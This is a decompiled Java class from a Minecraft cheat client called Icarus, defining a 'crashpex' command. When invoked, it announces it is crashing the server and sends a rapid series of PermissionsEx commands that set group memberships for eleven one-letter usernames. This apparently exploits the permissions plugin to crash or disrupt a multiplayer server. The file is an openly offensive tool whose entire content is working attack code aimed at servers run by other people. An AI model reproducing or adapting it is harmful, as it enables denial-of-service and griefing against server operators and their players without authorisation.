// 
// Decompiled by Procyon v0.5.30
// 

package net.andrewsnetwork.icarus.command.commands;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.client.Minecraft;
import net.andrewsnetwork.icarus.utilities.Logger;
import net.andrewsnetwork.icarus.command.Command;

public class CrashPEX extends Command
{
    public CrashPEX() {
        super("crashpex", "none");
    }
    
    @Override
    public void run(final String message) {
        Logger.writeChat("Crashing the shitty server right now!");
        final String[] letters = { "d", "b", "m", "l", "g", "h", "i", "l", "a", "v", "w" };
        for (int i = 0; i < letters.length; ++i) {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/permissionsex:pex user " + letters[i] + " group set 1337Exploit"));
        }
    }
}
